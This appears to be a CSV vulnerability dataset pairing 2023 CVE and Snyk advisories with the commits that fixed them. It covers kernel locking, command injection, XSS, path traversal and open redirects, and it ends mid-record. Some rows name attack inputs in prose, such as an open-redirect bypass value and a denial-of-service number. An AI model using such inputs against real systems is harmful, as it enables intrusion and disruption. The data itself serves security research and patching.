CVE-2023-31194,CWE-122,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-ARTHURSONZOGNIDIAGON-5756520,06/07/2023,06/07/2023,https://github.com/ArthurSonzogni/Diagon/commit/ee3e3ed1c4ad0a172ba6a7f3fd6efc857a67f697,Heap-based Buffer Overflow,https://api.github.com/repos/ArthurSonzogni/Diagon/commits/ee3e3ed1c4ad0a172ba6a7f3fd6efc857a67f697,ArthurSonzogni,sonzogniarthur@gmail.com,Diagon,ee3e3ed1c4ad0a172ba6a7f3fd6efc857a67f697,"Fix CVE-2023-31194

Before adding an edge to the Boost graph, check it has not been added.
Apparently, this causes Boost graph adjacency list to misbehave.

Bug:https://github.com/ArthurSonzogni/Diagon/issues/65",Unknown,4.0,medium,Affected versions of this package are vulnerable to Heap-based Buffer Overflow. An access violation vulnerability exists in the GraphPlanar::Write functionality. A specially crafted network request can lead to a heap buffer overflow. An attacker can send a network request to trigger this vulnerability.,2023
CVE-2023-3269,CWE-264,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5756518,06/07/2023,06/07/2023,https://github.com/torvalds/linux/commit/9471f1f2f50282b9e8f59198ec6bb738b4ccc009,Privilege Escalation,https://api.github.com/repos/torvalds/linux/commits/9471f1f2f50282b9e8f59198ec6bb738b4ccc009,Linus Torvalds,torvalds@linux-foundation.org,linux,9471f1f2f50282b9e8f59198ec6bb738b4ccc009,"Merge branch 'expand-stack'

This modifies our user mode stack expansion code to always take the
mmap_lock for writing before modifying the VM layout.

It's actually something we always technically should have done, but
because we didn't strictly need it, we were being lazy (""opportunistic""
sounds so much better, doesn't it?) about things, and had this hack in
place where we would extend the stack vma in-place without doing the
proper locking.

And it worked fine.  We just needed to change vm_start (or, in the case
of grow-up stacks, vm_end) and together with some special ad-hoc locking
using the anon_vma lock and the mm->page_table_lock, it all was fairly
straightforward.

That is, it was all fine until Ruihan Li pointed out that now that the
vma layout uses the maple tree code, we *really* don't just change
vm_start and vm_end any more, and the locking really is broken.  Oops.

It's not actually all _that_ horrible to fix this once and for all, and
do proper locking, but it's a bit painful.  We have basically three
different cases of stack expansion, and they all work just a bit
differently:

 - the common and obvious case is the page fault handling. It's actually
   fairly simple and straightforward, except for the fact that we have
   something like 24 different versions of it, and you end up in a maze
   of twisty little passages, all alike.

 - the simplest case is the execve() code that creates a new stack.
   There are no real locking concerns because it's all in a private new
   VM that hasn't been exposed to anybody, but lockdep still can end up
   unhappy if you get it wrong.

 - and finally, we have GUP and page pinning, which shouldn't really be
   expanding the stack in the first place, but in addition to execve()
   we also use it for ptrace(). And debuggers do want to possibly access
   memory under the stack pointer and thus need to be able to expand the
   stack as a special case.

None of these cases are exactly complicated, but the page fault case in
particular is just repeated slightly differently many many times.  And
ia64 in particular has a fairly complicated situation where you can have
both a regular grow-down stack _and_ a special grow-up stack for the
register backing store.

So to make this slightly more manageable, the bulk of this series is to
first create a helper function for the most common page fault case, and
convert all the straightforward architectures to it.

Thus the new 'lock_mm_and_find_vma()' helper function, which ends up
being used by x86, arm, powerpc, mips, riscv, alpha, arc, csky, hexagon,
loongarch, nios2, sh, sparc32, and xtensa.  So we not only convert more
than half the architectures, we now have more shared code and avoid some
of those twisty little passages.

And largely due to this common helper function, the full diffstat of
this series ends up deleting more lines than it adds.

That still leaves eight architectures (ia64, m68k, microblaze, openrisc,
parisc, s390, sparc64 and um) that end up doing 'expand_stack()'
manually because they are doing something slightly different from the
normal pattern.  Along with the couple of special cases in execve() and
GUP.

So there's a couple of patches that first create 'locked' helper
versions of the stack expansion functions, so that there's a obvious
path forward in the conversion.  The execve() case is then actually
pretty simple, and is a nice cleanup from our old ""grow-up stackls are
special, because at execve time even they grow down"".

The #ifdef CONFIG_STACK_GROWSUP in that code just goes away, because
it's just more straightforward to write out the stack expansion there
manually, instead od having get_user_pages_remote() do it for us in some
situations but not others and have to worry about locking rules for GUP.

And the final step is then to just convert the remaining odd cases to a
new world order where 'expand_stack()' is called with the mmap_lock held
for reading, but where it might drop it and upgrade it to a write, only
to return with it held for reading (in the success case) or with it
completely dropped (in the failure case).

In the process, we remove all the stack expansion from GUP (where
dropping the lock wouldn't be ok without special rules anyway), and add
it in manually to __access_remote_vm() for ptrace().

Thanks to Adrian Glaubitz and Frank Scheiner who tested the ia64 cases.
Everything else here felt pretty straightforward, but the ia64 rules for
stack expansion are really quite odd and very different from everything
else.  Also thanks to Vegard Nossum who caught me getting one of those
odd conditions entirely the wrong way around.

Anyway, I think I want to actually move all the stack expansion code to
a whole new file of its own, rather than have it split up between
mm/mmap.c and mm/memory.c, but since this will have to be backported to
the initial maple tree vma introduction anyway, I tried to keep the
patches _fairly_ minimal.

Also, while I don't think it's valid to expand the stack from GUP, the
final patch in here is a ""warn if some crazy GUP user wants to try to
expand the stack"" patch.  That one will be reverted before the final
release, but it's left to catch any odd cases during the merge window
and release candidates.

Reported-by: Ruihan Li <lrh2000@pku.edu.cn>

* branch 'expand-stack':
  gup: add warning if some caller would seem to want stack expansion
  mm: always expand the stack with the mmap write lock held
  execve: expand new process stack manually ahead of time
  mm: make find_extend_vma() fail if write lock not held
  powerpc/mm: convert coprocessor fault to lock_mm_and_find_vma()
  mm/fault: convert remaining simple cases to lock_mm_and_find_vma()
  arm/mm: Convert to using lock_mm_and_find_vma()
  riscv/mm: Convert to using lock_mm_and_find_vma()
  mips/mm: Convert to using lock_mm_and_find_vma()
  powerpc/mm: Convert to using lock_mm_and_find_vma()
  arm64/mm: Convert to using lock_mm_and_find_vma()
  mm: make the page fault mmap locking killable
  mm: introduce new 'lock_mm_and_find_vma()' page fault helper",Unknown,8.0,high,"Affected versions of this package are vulnerable to Privilege Escalation. The maple tree, responsible for managing virtual memory areas, can undergo node replacement without properly acquiring the MM write lock, leading to use-after-free issues. An unprivileged local user could use this flaw to compromise the kernel and escalate their privileges.",2023
CVE-2023-36458,CWE-77,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOM1PANELDEV1PANELBACKEND-5756515,06/07/2023,06/07/2023,https://github.com/1Panel-dev/1Panel/commit/d2087641f790c56a6dc943eba0a317485656fc7c,Arbitrary Command Injection,https://api.github.com/repos/1Panel-dev/1Panel/commits/d2087641f790c56a6dc943eba0a317485656fc7c,ssongliu,songlius11@163.com,1Panel,d2087641f790c56a6dc943eba0a317485656fc7c,fix: 解决终端连接注入漏洞问题,Go,6.3,medium,Affected versions of this package are vulnerable to Arbitrary Command Injection. An authenticated attacker can craft a malicious payloads to achieve command injection when entering the container terminal.,2023
CVE-2023-35939,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-PHP-GLPIGLPI-5756517,06/07/2023,06/07/2023,https://github.com/glpi-project/glpi/commit/6fcdcba244d7839bd20be6957be804c888f5febc,Access Control Bypass,https://api.github.com/repos/glpi-project/glpi/commits/6fcdcba244d7839bd20be6957be804c888f5febc,Cédric Anne,cedric.anne@gmail.com,glpi,6fcdcba244d7839bd20be6957be804c888f5febc,"Fix right access check on dashboards

- Prevent anonymous access to dashboard cards
- Enhance rights checks on dashboard front files
- Add rights checks on dashboard AJAX endpoints
- Ensure new dashboard is private by default",PHP,8.1,high,"glpi/glpi is a free Asset and IT Management Software package with ITIL Service Desk, licenses tracking and software auditing.
Affected versions of this package are vulnerable to Access Control Bypass due to incorrect rights check on a file accessible by an authenticated user (or not for certain actions), allowing a threat actor to interact, modify, or see Dashboard data.",2023
CVE-2023-36457,CWE-77,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOM1PANELDEV1PANELBACKEND-5756514,06/07/2023,06/07/2023,https://github.com/1Panel-dev/1Panel/commit/321ed007348e5769681fda4ccb1024c1b91c65e6,Arbitrary Command Injection,https://api.github.com/repos/1Panel-dev/1Panel/commits/321ed007348e5769681fda4ccb1024c1b91c65e6,ssongliu,songlius11@163.com,1Panel,321ed007348e5769681fda4ccb1024c1b91c65e6,fix: 解决添加仓库注入漏洞问题,Go,6.3,medium,Affected versions of this package are vulnerable to Arbitrary Command Injection. An authenticated attacker can craft a malicious payload to achieve command injection when adding container repositories.,2023
CVE-2023-36827,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-ETHYCAFIDES-5756513,06/07/2023,06/07/2023,https://github.com/ethyca/fides/commit/5a36682d25b4daca1f078c49aced24e64aed3ab1,Directory Traversal,https://api.github.com/repos/ethyca/fides/commits/5a36682d25b4daca1f078c49aced24e64aed3ab1,Sean Preston,sean@ethyca.com,fides,5a36682d25b4daca1f078c49aced24e64aed3ab1,"Merge pull request from GHSA-r25m-cr6v-p9hq

* fix for vuln

* Apply suggestions from code review

Use correct spelling of malicious.

Co-authored-by: Adam Sachs <adam@ethyca.com>

* Update src/fides/api/main.py

Verbiage

Co-authored-by: Thomas <thomas.lapiana+github@pm.me>

---------

Co-authored-by: Adam Sachs <adam@ethyca.com>
Co-authored-by: Thomas <thomas.lapiana+github@pm.me>
Co-authored-by: Dave Quinlan <83430497+daveqnet@users.noreply.github.com>",Python,7.5,high,"ethyca-fides is an Open-source ecosystem for data privacy as code.
Affected versions of this package are vulnerable to Directory Traversal such that it allows remote attackers to access arbitrary files on the fides webserver container's filesystem.
Note:
If the Fides webserver API is not directly accessible to attackers and is instead deployed behind a reverse proxy as recommended in Ethyca's security best practice documentation, and the reverse proxy is an AWS application load balancer, the vulnerability can't be exploited by these attackers. An AWS application load balancer will reject this attack with a 400 error. Additionally, any secrets supplied to the container using environment variables rather than a fides.toml configuration file are not affected by this vulnerability.",2023
CVE-2023-36809,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-KIWITCMS-5756512,06/07/2023,06/07/2023,https://github.com/kiwitcms/kiwi/commit/195ea53eaaf360c19227c864cc0fe58910032c3c,Cross-site Scripting (XSS),https://api.github.com/repos/kiwitcms/kiwi/commits/195ea53eaaf360c19227c864cc0fe58910032c3c,Alexander Todorov,atodorov@otb.bg,kiwi,195ea53eaaf360c19227c864cc0fe58910032c3c,Sanitize test plan name in tree_view_html(),Python,8.1,high,"kiwitcms is a Test Case Management System
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization, by allowing certain browsers like Firefox to ignore the Content-Type: text/plain header on some occasions thus allowing potentially dangerous scripts to be executed.",2023
CVE-2023-34107,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-PHP-GLPIGLPI-5756511,06/07/2023,06/07/2023,https://github.com/glpi-project/glpi/commit/0eefeff7c63b90a18afc10dc4ff19fd5e32c396c,Access Control Bypass,https://api.github.com/repos/glpi-project/glpi/commits/0eefeff7c63b90a18afc10dc4ff19fd5e32c396c,Rom1-B,rbiot@teclib.com,glpi,0eefeff7c63b90a18afc10dc4ff19fd5e32c396c,fix(knowbase): save tree browser,PHP,6.5,medium,"glpi/glpi is a free Asset and IT Management Software package with ITIL Service Desk, licenses tracking and software auditing.
Affected versions of this package are vulnerable to Access Control Bypass due to incorrect rights checks on a file accessible by an authenticated user, allows access to the view all KnowbaseItems.",2023
CVE-2023-30207,CWE-369,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-XBMCXBMC-5756516,06/07/2023,06/07/2023,https://github.com/xbmc/xbmc/commit/dbc00c500f4c4830049cc040a61c439c580eea73,Division by zero,https://api.github.com/repos/xbmc/xbmc/commits/dbc00c500f4c4830049cc040a61c439c580eea73,fritsch,Peter.Fruehberger@gmail.com,xbmc,dbc00c500f4c4830049cc040a61c439c580eea73,"VideoPlayerCodec: Stop dividing by zero

When parsing a file failed so that needed fields, in our case frameSize
are not available a guess work like with m_channels or m_samplerate does
not help. Therefore fail early.",C/C++,5.5,medium,Affected versions of this package are vulnerable to Division by zero allowing attackers to cause a denial of service via the use of a crafted mp3 file.,2023
CVE-2023-34457,CWE-20,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-MECHANICALSOUP-5756510,06/07/2023,06/07/2023,https://github.com/MechanicalSoup/MechanicalSoup/commit/d57c4a269bba3b9a0c5bfa20292955b849006d9e,Improper Input Validation,https://api.github.com/repos/MechanicalSoup/MechanicalSoup/commits/d57c4a269bba3b9a0c5bfa20292955b849006d9e,Eduard Christian Dumitrescu,eduard.c.dumitrescu@gmail.com,MechanicalSoup,d57c4a269bba3b9a0c5bfa20292955b849006d9e,"Merge pull request from GHSA-x456-3ccm-m6j4

* Add suggested mitigation against malicious HTML form file input. Test cases and docs not updated.

* Make tests pass. Add test specifically for this vulnerability. Fix the `Form.new_control()` method so that it correctly sets the input value if the value is a file object.

* Add better documentation about the vulnerability remediation. Wording fix.

* tests: Add separate test to check for CVE-2023-34457.

* Revert ""tests: Add separate test to check for CVE-2023-34457.""

This reverts commit bd4c6d92a8a803499a447b511bc46b1ba00841d0.

* Misc cleanup

* No need to raise the error on forms with an enctype that do not
  upload files (e.g. everything besides multipart).

* Make sure that open file inputs are converted to their basename
  regardless of what kind of form it is to avoid leaking local file
  paths.

* Throw error at time when the file input is set incorrectly, rather
  than at submission time.

* Factor complex repeated logic into their own functions (i.e. for
  the multipart file input check and invalid file value check).

* Fix failing tests.

* Avoid excessive whitespace in exception message.

* Reorder 'and' operands so the slightly less expensive check comes first.

---------

Co-authored-by: Dan Hemberger <daniel.hemberger@gmail.com>",Python,5.9,medium,"MechanicalSoup is an A Python library for automating interaction with websites
Affected versions of this package are vulnerable to Improper Input Validation such that a malicious web server can read arbitrary files on the client using a <input type=""file"" ...> inside HTML form.
Note:
All users of MechanicalSoup's form submission are affected, unless they took very specific (and manual) steps to reset HTML form field values.",2023
CVE-2023-3515,CWE-601,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-CODEGITEAIOGITEAMODULESCONTEXT-5756508,06/07/2023,06/07/2023,https://github.com/go-gitea/gitea/commit/a9030052a7b92bdfa1a6be0cdb540050a16ba31e,Open Redirect,https://api.github.com/repos/go-gitea/gitea/commits/a9030052a7b92bdfa1a6be0cdb540050a16ba31e,Lauris BH,lauris@nix.lv,gitea,a9030052a7b92bdfa1a6be0cdb540050a16ba31e,"Fix open redirect check for more cases (#25143) (#25155)

Backport https://github.com/go-gitea/gitea/pull/25143

If redirect_to parameter has set value starting with \\example.com
redirect will be created with header Location: /\\example.com that will
redirect to example.com domain.",Go,3.0,low,Affected versions of this package are vulnerable to Open Redirect due to insufficient checks in the context_response.go file.,2023
CVE-2023-3515,CWE-601,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOGITEAGITEAMODULESCONTEXT-5756507,06/07/2023,06/07/2023,https://github.com/go-gitea/gitea/commit/a9030052a7b92bdfa1a6be0cdb540050a16ba31e,Open Redirect,https://api.github.com/repos/go-gitea/gitea/commits/a9030052a7b92bdfa1a6be0cdb540050a16ba31e,Lauris BH,lauris@nix.lv,gitea,a9030052a7b92bdfa1a6be0cdb540050a16ba31e,"Fix open redirect check for more cases (#25143) (#25155)

Backport https://github.com/go-gitea/gitea/pull/25143

If redirect_to parameter has set value starting with \\example.com
redirect will be created with header Location: /\\example.com that will
redirect to example.com domain.",Go,3.0,low,Affected versions of this package are vulnerable to Open Redirect due to insufficient checks in the context_response.go file.,2023
CVE-2023-30584,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-UPSTREAM-NODE-5756503,06/07/2023,20/06/2023,https://github.com/nodejs/node/commit/b51124c6371eba7e0a5f98ca1a05f40ed2deb4d6,Directory Traversal,https://api.github.com/repos/nodejs/node/commits/b51124c6371eba7e0a5f98ca1a05f40ed2deb4d6,RafaelGSS,rafael.nunu@hotmail.com,node,b51124c6371eba7e0a5f98ca1a05f40ed2deb4d6,"permission: handle fs path traversal

PR-URL: https://github.com/nodejs-private/node-private/pull/403
Refs: https://hackerone.com/bugs?subject=nodejs&report_id=1952978
Reviewed-By: Matteo Collina <matteo.collina@gmail.com>
CVE-ID: CVE-2023-30584",JavaScript,7.5,high,"node is a JavaScript runtime built on Chrome's V8 JavaScript engine.
Affected versions of this package are vulnerable to Directory Traversal. This flaw relates to improper handling of path traversal bypass when verifying file permissions. 
Note:
This vulnerability affects all users using the experimental permission model in Node.js 20.
At the time this CVE was issued, the permission model is an experimental feature of Node.js.",2023
,CWE-264,Snyk,https://security.snyk.io/vuln/SNYK-PHP-OPENSOURCEWORKSHOPCONNECTCMS-5756509,06/07/2023,06/07/2023,https://github.com/opensource-workshop/connect-cms/commit/c394f8a53da0891e49550130ed74477a57b9881a,Privilege Escalation,https://api.github.com/repos/opensource-workshop/connect-cms/commits/c394f8a53da0891e49550130ed74477a57b9881a,gakigaki,e3e3e3d@gmail.com,connect-cms,c394f8a53da0891e49550130ed74477a57b9881a,fix: GHSA-qxh3-jgvh-x55j,PHP,4.3,medium,Affected versions of this package are vulnerable to Privilege Escalation due to improper user-input sanitization in the UploadController.php file.,2023
CVE-2023-30583,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-UPSTREAM-NODE-5756502,06/07/2023,20/06/2023,https://github.com/nodejs/node/commit/ebc5927adc3a0ffd44afc172ac678692b72c3bbb,Access Restriction Bypass,https://api.github.com/repos/nodejs/node/commits/ebc5927adc3a0ffd44afc172ac678692b72c3bbb,RafaelGSS,rafael.nunu@hotmail.com,node,ebc5927adc3a0ffd44afc172ac678692b72c3bbb,"permission: handle fs.openAsBlob

Refs: https://hackerone.com/bugs?subject=nodejs&report_id=1966492
PR-URL: https://github.com/nodejs-private/node-private/pull/405
Reviewed-By: Tobias Nießen <tniessen@tnie.de>
Reviewed-By: Colin Ihrig <cjihrig@gmail.com>
Reviewed-By: Matteo Collina <matteo.collina@gmail.com>
CVE-ID: CVE-2023-30583",JavaScript,5.3,medium,"node is a JavaScript runtime built on Chrome's V8 JavaScript engine.
Affected versions of this package are vulnerable to Access Restriction Bypass such that the fs.openAsBlob() method  can bypass the experimental permission model when using the file system read restriction with the --allow-fs-read flag. 
Note:
This vulnerability affects all users using the experimental permission model in Node.js 20.
At the time this CVE was issued, the permission model is an experimental feature of Node.js.",2023
,CWE-474,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-KUZU-5759306,07/07/2023,07/07/2023,https://github.com/kuzudb/kuzu/commit/b6267047c6d9c3d316330c745946368b27c3e823,Use of Function with Inconsistent Implementations,https://api.github.com/repos/kuzudb/kuzu/commits/b6267047c6d9c3d316330c745946368b27c3e823,ziyi chen,chenziyi990424@gmail.com,kuzu,b6267047c6d9c3d316330c745946368b27c3e823,Fix string format vulnerability,Unknown,5.3,medium,"kuzu is an An in-process property graph database management system built for query speed and scalability.
Affected versions of this package are vulnerable to Use of Function with Inconsistent Implementations due to using an insecure function.",2023
,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-MLRUN-5759305,07/07/2023,07/07/2023,https://github.com/mlrun/mlrun/commit/353202516934fcf307fb5530e5bba138271efa37,SQL Injection,https://api.github.com/repos/mlrun/mlrun/commits/353202516934fcf307fb5530e5bba138271efa37,Gal Topper,galt@iguazio.com,mlrun,353202516934fcf307fb5530e5bba138271efa37,[Datastore] Fix SQL injection vulnerabilities (#3680),Python,8.3,high,"mlrun is a Tracking and config of machine learning runs
Affected versions of this package are vulnerable to SQL Injection due to improper user-input sanitization in Datastore.",2023
,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-PARSITA-5759304,07/07/2023,07/07/2023,https://github.com/drhagen/parsita/commit/7508e5903600592627f9a1f1fc178a561ee690b1,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/drhagen/parsita/commits/7508e5903600592627f9a1f1fc178a561ee690b1,David Hagen,david@drhagen.com,parsita,7508e5903600592627f9a1f1fc178a561ee690b1,Change line length to 99 (#91),Python,5.3,medium,"parsita is a Parser combinator library for Python
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to missing length checks.",2023
CVE-2023-34244,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-GLPIGLPI-5756506,06/07/2023,06/07/2023,https://github.com/glpi-project/glpi/commit/5f8ba46031a127816a17b449b7f81cfc9361845e,Cross-site Scripting (XSS),https://api.github.com/repos/glpi-project/glpi/commits/5f8ba46031a127816a17b449b7f81cfc9361845e,Cédric Anne,cedric.anne@gmail.com,glpi,5f8ba46031a127816a17b449b7f81cfc9361845e,Escape inventory agent answer,Unknown,6.5,medium,"glpi/glpi is a free Asset and IT Management Software package with ITIL Service Desk, licenses tracking and software auditing.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization by allowing an unauthenticated attacker to craft a malicious link.",2023
CVE-2021-46896,CWE-120,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-PX4PX4AUTOPILOT-5759302,07/07/2023,07/07/2023,https://github.com/PX4/PX4-Autopilot/commit/0bdcd5418468526d28cd09ac4c181d37422cf077,Buffer Overflow,https://api.github.com/repos/PX4/PX4-Autopilot/commits/0bdcd5418468526d28cd09ac4c181d37422cf077,Daniel Agar,daniel@agar.ca,PX4-Autopilot,0bdcd5418468526d28cd09ac4c181d37422cf077,"mavlink: reciever trajectory_representation_waypoints resepect valid_points

 - fixes https://github.com/PX4/PX4-Autopilot/issues/18369",C/C++,7.3,high,Affected versions of this package are vulnerable to Buffer Overflow allowing attackers to cause a denial of service via the handler function.,2023
,CWE-835,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-PULPCORE-5759303,07/07/2023,07/07/2023,https://github.com/pulp/pulpcore/commit/244988496900843a412e42ebff95468a4e682635,Infinite loop,https://api.github.com/repos/pulp/pulpcore/commits/244988496900843a412e42ebff95468a4e682635,Simon Peeters,peeters.simon@gmail.com,pulpcore,244988496900843a412e42ebff95468a4e682635,"don't go into an infinite loop when `CONTENT_PATH_PREFIX` is followed by `/`

this would cause `path` to start with a `/`
and because
```
>>> os.path.split('/path')
('/', 'path')
>>> os.path.split('/')
('/', '')
```
`base` would never end up as `None` but stay as `/` resulting in an infinite loop.

fixes #7066",Unknown,7.5,high,"pulpcore is a Pulp Django Application and Related Modules
Affected versions of this package are vulnerable to Infinite loop when CONTENT_PATH_PREFIX is followed by /.",2023
CVE-2023-36456,CWE-436,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GOAUTHENTIKIO-5759296,07/07/2023,07/07/2023,https://github.com/goauthentik/authentik/commit/15026748d19d490eb2baf9a9566ead4f805f7dff,Interpretation Conflict,https://api.github.com/repos/goauthentik/authentik/commits/15026748d19d490eb2baf9a9566ead4f805f7dff,Jens Langhammer,jens@goauthentik.io,authentik,15026748d19d490eb2baf9a9566ead4f805f7dff,"security: fix CVE-2023-36456

Signed-off-by: Jens Langhammer <jens@goauthentik.io>

# Conflicts:
#	website/sidebars.js",Config files,8.3,high,"Affected versions of this package are vulnerable to Interpretation Conflict due to not verifying the source of the X-Forwarded-For and X-Real-IP headers both in the Python code and the go code.
Note:
Only authentik setups that are directly accessible by users without a reverse proxy are susceptible to this.",2023
,CWE-330,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGGRAYLOG2-5759294,07/07/2023,07/07/2023,https://github.com/Graylog2/graylog2-server/commit/466af814523cffae9fbc7e77bab7472988f03c3e,Insecure Randomness,https://api.github.com/repos/Graylog2/graylog2-server/commits/466af814523cffae9fbc7e77bab7472988f03c3e,Dan Torrey,dan@graylog.com,graylog2-server,466af814523cffae9fbc7e77bab7472988f03c3e,"Merge pull request from GHSA-g96c-x7rh-99r3

* Add support for randomizing DNS Lookup source port

* Clarify purpose of lease

* Skip initial refresh

Previously, the pool was being refreshed immediately upon initialization. Now, the refresh waits until the `poolRefreshSeconds` duration has elapsed.

* Ensure thread safety, skip unused poller refreshes

* Add change log",Unknown,6.5,medium,"org.graylog2:graylog2-server is a log management platform.
Affected versions of this package are vulnerable to Insecure Randomness such that an external attacker could inject forged DNS responses into a Graylog's lookup table cache. Graylog seems to bind a single socket for outgoing DNS queries. That socket is bound to a random port number which is not changed again.",2023
CVE-2023-36456,CWE-436,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOAUTHENTIKAUTHENTIK-5759295,07/07/2023,07/07/2023,https://github.com/goauthentik/authentik/commit/15026748d19d490eb2baf9a9566ead4f805f7dff,Interpretation Conflict,https://api.github.com/repos/goauthentik/authentik/commits/15026748d19d490eb2baf9a9566ead4f805f7dff,Jens Langhammer,jens@goauthentik.io,authentik,15026748d19d490eb2baf9a9566ead4f805f7dff,"security: fix CVE-2023-36456

Signed-off-by: Jens Langhammer <jens@goauthentik.io>

# Conflicts:
#	website/sidebars.js",Config files,8.3,high,"Affected versions of this package are vulnerable to Interpretation Conflict due to not verifying the source of the X-Forwarded-For and X-Real-IP headers both in the Python code and the go code.
Note:
Only authentik setups that are directly accessible by users without a reverse proxy are susceptible to this.",2023
CVE-2023-36828,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-STATAMICCMS-5759297,07/07/2023,07/07/2023,https://github.com/statamic/cms/commit/c714893ad92de6e5ede17b501003441af505b30d,Cross-site Scripting (XSS),https://api.github.com/repos/statamic/cms/commits/c714893ad92de6e5ede17b501003441af505b30d,Jason Varga,jason@pixelfear.com,cms,c714893ad92de6e5ede17b501003441af505b30d,[4.x] SVG tag sanitization (#8408),Config files,5.5,medium,"Affected versions of this package are vulnerable to Cross-site Scripting (XSS) such that the SVG tag does not sanitize malicious SVG. Therefore, an attacker can exploit this vulnerability to perform XSS attacks using SVG, even when using the sanitize function.",2023
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-VENDUREADMINUIPLUGIN-5759288,07/07/2023,06/07/2023,https://github.com/vendure-ecommerce/vendure/commit/0cdc92b241e6fd4017ddfc9fbdca189fc7c1ada0,Cross-site Scripting (XSS),https://api.github.com/repos/vendure-ecommerce/vendure/commits/0cdc92b241e6fd4017ddfc9fbdca189fc7c1ada0,Michael Bromley,michaelbromley@users.noreply.github.com,vendure,0cdc92b241e6fd4017ddfc9fbdca189fc7c1ada0,"Merge pull request from GHSA-gm68-572p-q28r

* fix(admin-ui): Prevent XSS in rich text editor

* fix(admin-ui): Prevent XSS in iframe srcdoc in rich text editor",TypeScript,4.8,medium,"@vendure/admin-ui-plugin is a npm install @vendure/admin-ui-plugin
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization In the admin UI. While the WYSIWYG editor allows limited customization, altering the request data (not in the UI) saves and returns arbitrary HTML with no sanitization.",2023
,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGGRAYLOG2-5759293,07/07/2023,07/07/2023,https://github.com/Graylog2/graylog2-server/commit/02b8792e6f4b829f0c1d87fcbf2d58b73458b938,Directory Traversal,https://api.github.com/repos/Graylog2/graylog2-server/commits/02b8792e6f4b829f0c1d87fcbf2d58b73458b938,Bernd Ahlers,bernd@users.noreply.github.com,graylog2-server,02b8792e6f4b829f0c1d87fcbf2d58b73458b938,"Merge pull request from GHSA-2q4p-f6gf-mqr5

* Fix filename validation in Support Bundle handling

The previous implementation of ""SupportBundle#ensureFileWithinBundleDir""
was affected by a partial path traversal vulnerability and allowed
authenticated users with the Admin role to download or delete files in
sibling directories of the support bundle data directory.

See: https://github.com/Graylog2/graylog2-server/security/advisories/GHSA-2q4p-f6gf-mqr5

* Add changelog snippet

* Fix bundle download with relative data_dir config

* Fix test for the assertj version we are using in 5.1

* Fix another test case",Unknown,4.9,medium,"org.graylog2:graylog2-server is a log management platform.
Affected versions of this package are vulnerable to Directory Traversal due to incorrect user input validation in an HTTP API resource. A partial path traversal vulnerability exists in Graylog's Support Bundle feature. An attacker with valid Admin role credentials can read or delete files in directories that start with a /var/lib/graylog-server/support-bundle directory name.
The vulnerability would allow the download or deletion of files in the following example directories.

/var/lib/graylog-server/support-bundle-test
/var/lib/graylog-server/support-bundlesdirectory

For the Graylog and Graylog Enterprise Docker images, the data_dir is set to /usr/share/graylog/data by default.",2023
CVE-2023-33008,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHEJOHNZON-5759289,07/07/2023,07/07/2023,https://github.com/apache/johnzon/commit/9f6ad2146a1a85cf9c5899ba6de9d3a624999f38,Deserialization of Untrusted Data,https://api.github.com/repos/apache/johnzon/commits/9f6ad2146a1a85cf9c5899ba6de9d3a624999f38,Jean-Louis Monteiro,jlmonteiro@tomitribe.com,johnzon,9f6ad2146a1a85cf9c5899ba6de9d3a624999f38,"fix(JOHNZON-397): protection against very slow BigDecimal to BigInteger conversion at large scale

Signed-off-by: Jean-Louis Monteiro <jlmonteiro@tomitribe.com>",Java,7.5,high,Affected versions of this package are vulnerable to Deserialization of Untrusted Data. A malicious attacker can craft up a JSON input that uses large numbers (numbers such as 1e20000000) that Apache Johnzon will deserialize into BigDecimal and maybe use numbers too large which may result in a slow conversion.,2023
,CWE-613,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGGRAYLOG2-5759290,07/07/2023,07/07/2023,https://github.com/Graylog2/graylog2-server/commit/bb88f3d0b2b0351669ab32c60b595ab7242a3fe3,Insufficient Session Expiration,https://api.github.com/repos/Graylog2/graylog2-server/commits/bb88f3d0b2b0351669ab32c60b595ab7242a3fe3,Bernd Ahlers,bernd@users.noreply.github.com,graylog2-server,bb88f3d0b2b0351669ab32c60b595ab7242a3fe3,"Merge pull request from GHSA-3fqm-frhg-7c85

- Clear session from cache on all nodes after deletion
- Add changelog

Co-authored-by: Othello Maurer <othello@graylog.com>",Unknown,5.4,medium,"org.graylog2:graylog2-server is a log management platform.
